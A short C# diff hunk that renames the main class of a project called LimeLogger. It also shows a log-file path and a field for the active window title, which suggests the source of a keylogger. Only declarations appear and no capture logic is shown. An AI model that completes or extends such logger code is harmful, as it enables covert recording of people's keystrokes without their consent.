@@ -15,7 +15,7 @@ using System.Windows.Forms;
 
 namespace LimeLogger
 {
-    class Program
+   public static class LimeLogger
     {
         private static readonly string loggerPath = Application.StartupPath + @"\log.txt";
         private static string CurrentActiveWindowTitle;
